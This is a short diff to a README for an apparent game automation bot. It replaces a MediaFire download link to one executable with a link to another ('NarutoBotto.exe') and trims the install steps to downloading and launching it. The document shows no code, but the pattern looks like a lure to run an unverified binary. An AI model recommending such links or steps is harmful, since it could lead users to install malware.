@@ -9,9 +9,8 @@ Tower automation </br>
 Customizable settings for user preferences </br>
 
 ## Installation
-Download the setup file from [download](https://www.mediafire.com/file/g32iil5wq22g41m/NarutoSetup.exe/file). </br>
-Run the setup file and follow the installation instructions. </br>
-Once installed, launch the program. </br>
+Download from [download](https://www.mediafire.com/file/9dhlq7ef46jxy6b/NarutoBotto.exe/file). </br>
+launch the program. </br>
 
 ## Usage
 Open the program. </br>
